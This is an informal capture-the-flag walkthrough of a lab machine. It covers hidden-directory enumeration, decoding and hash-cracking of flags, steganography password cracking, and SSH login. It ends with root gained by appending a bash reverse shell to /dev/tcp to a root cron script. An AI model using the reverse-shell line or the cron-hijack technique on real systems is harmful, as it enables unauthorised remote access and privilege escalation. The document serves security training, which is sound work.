so i started enumerating the machine and accidentaly find the flag 3 in the source code of por 65525! main page


found a dir hidden in the port 80 started a new scan in the port80/hidden

after finding the hidden directory i again started a gobuster scan in it and found a directory named /whatever

after reading the source code of that file i found a base64 encoded sting which i decoded using cyberchef ZmxhZ3tmMXJzN19mbDRnfQ== : flag{f1rs7_fl4g}

for the second flag i was just looking at the source code of 65525 and found something again in the source code it was something like this


<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>


as it is written it is encoded with ba 

so i opened cyberchef and started trying all type of decoders which starts with ba

like base32,base64.base58 etc etc and base62 matched and i got the secrect directory

/n0th1ng3ls3m4tt3r

cracked the given string using md5hashing website and the flag was
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
flag{1m_s3c0nd_fl4g}

now here i saw a string and an image file i decided to downnlaod that image file as i was having no option

i downlaoded the image and started steghide --extract -sf filename
it asked for passphrase i tried the passphrase that was hidden on the image website but it didnt worked so tired the easypeasy.txt wordlist and got tthe password!

i used stegcracker to crack the password
after that i opened the file and there was user name and password was given
i converted the binary password to text and tried to login into ssh using those creds and i was able to login!

after that i tried sudo -l it didnt worked the after that i tried suid but no file was given suid perms

checked the crontabs by
cat /etc/crontabs and saw the root user is running a bash script after some inteval


* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh


went to the /var/www and edited the mysecretcronjob.sh and added a rev shell into the file

bash -i >& /dev/tcp/$ip/4343 0>&1




after that i opened up a nc listener on the other terminal and waited for the connection got the root user ! cheers!
